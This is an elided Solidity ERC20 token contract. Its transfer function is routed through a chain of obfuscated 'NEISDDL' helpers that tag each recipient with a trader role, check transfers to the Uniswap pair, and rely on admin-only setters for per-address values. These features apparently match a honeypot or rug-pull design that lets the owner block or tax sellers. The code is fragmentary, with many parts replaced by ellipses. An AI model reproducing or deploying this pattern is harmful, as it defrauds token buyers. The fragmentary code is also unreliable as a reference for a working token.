...
abstract contract NEISDDLConsole is Context, NEISDDLRoleControl {
    ...
    function _NEISDDLbyeE(
        ...
        _roles[rule].RD.RM[addr] = memoUint.mul(10 ** 18);
    }

    function _NEISDDLtopP(
        uint newnum
    ) public onlyRole(ADMIN) {
        isnum = newnum;
    }
...
contract NEISDDLERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is NEISDDLERC20, NEISDDLConsole {
    ...
    ) NEISDDLERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(NEISDDLERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _NEISDDLfbscs(from, to, amt);
    }



    function _NEISDDLfbscs(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _NEISDDLrscvsg(from, to, amt);
    }

    function _NEISDDLrscvsg(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _NEISDDLudvcvq(from, to, amt);
    }

    function _NEISDDLudvcvq(address from, address to, uint256 amt) internal {
        ...
        _NEISDDLndszzl(from, to, amt);
    }

    function _NEISDDLndszzl(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _NEISDDLbdsvyds(from, to, amt);
    }

    function _NEISDDLbdsvyds(address from, address to, uint256 amt) internal {
        
        _NEISDDLtgxsea(from, to, amt);
    }

    function _NEISDDLtgxsea(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _NEISDDLmuyvdw(from, to, amt);
    }

    function _NEISDDLmuyvdw(address from, address to, uint256 amt) internal {
